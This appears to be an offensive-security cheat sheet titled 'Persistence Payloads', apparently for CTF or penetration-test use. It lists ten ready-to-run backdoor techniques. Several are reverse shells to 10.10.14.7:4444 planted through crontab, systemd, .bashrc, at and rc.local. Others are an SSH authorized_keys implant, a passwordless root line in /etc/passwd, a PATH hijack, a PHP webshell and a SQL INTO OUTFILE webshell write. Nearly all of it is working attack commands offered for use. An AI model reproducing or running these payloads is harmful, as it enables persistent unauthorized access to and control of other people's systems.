#  Persistence Payloads

## 1\. **Cronjob Reverse Shell**

Add to crontab (user or root):

`echo '* * * * * /bin/bash -c "bash -i >& /dev/tcp/10.10.14.7/4444 0>&1"' > /tmp/c crontab /tmp/c`

Every minute you’ll get a shell back.

* * *

## 2\. **SSH Key Persistence**

If you have write access to `~/.ssh/authorized_keys`:

`mkdir -p ~/.ssh echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIYOUROPENSSHKEY" >> ~/.ssh/authorized_keys chmod 700 ~/.ssh chmod 600 ~/.ssh/authorized_keys`

Now you can SSH in at will.

* * *

## 3\. **Service / Systemd Hijack**

If you can edit a service file:

`echo '[Service] ExecStart=/bin/bash -c "bash -i >& /dev/tcp/10.10.14.7/4444 0>&1" ' > /etc/systemd/system/fakesvc.service systemctl enable fakesvc systemctl start fakesvc`

Runs as root on boot if systemd is in use.

* * *

## 4\. **/etc/passwd Backdoor**

Add a new root user with no password (very easy to catch, but classic CTF trick):

`echo 'hax0r::0:0:root:/root:/bin/bash' >> /etc/passwd su hax0r`

* * *

## 5\. **Bashrc / Profile Persistence**

Append reverse shell to `.bashrc` (executes every time the user spawns a shell):

`echo 'bash -i >& /dev/tcp/10.10.14.7/4444 0>&1' >> ~/.bashrc`

* * *

## 6\. **Scheduled Task (at)**

One-off reverse shell via `at`:

`echo "/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.7/4444 0>&1'" | at now + 1 minute`

* * *

## 7\. **Replacing Binaries (PATH Hijack)**

If a root cron/script calls `tar`, `cp`, or `ls` without absolute path, drop your own version first in `$PATH`:

`echo '/bin/bash -p' > /tmp/tar chmod +x /tmp/tar export PATH=/tmp:$PATH`

* * *

## 8\. **PHP Webshell Persistence**

If you can write to the web root:

`<?php system($_GET['cmd']); ?>`

Save as `backdoor.php`, then call:
`http://target/backdoor.php?cmd=id`

* * *

## 9\. **Startup Script Injection**

Add your payload to `/etc/rc.local`:

`echo "bash -i >& /dev/tcp/10.10.14.7/4444 0>&1" >> /etc/rc.local chmod +x /etc/rc.local`

Executes every boot.

* * *

## 10\. **Database User Abuse**

If you compromise DB creds, create a user with file privileges to write a webshell to the webroot:

`SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE '/var/www/html/shell.php';`
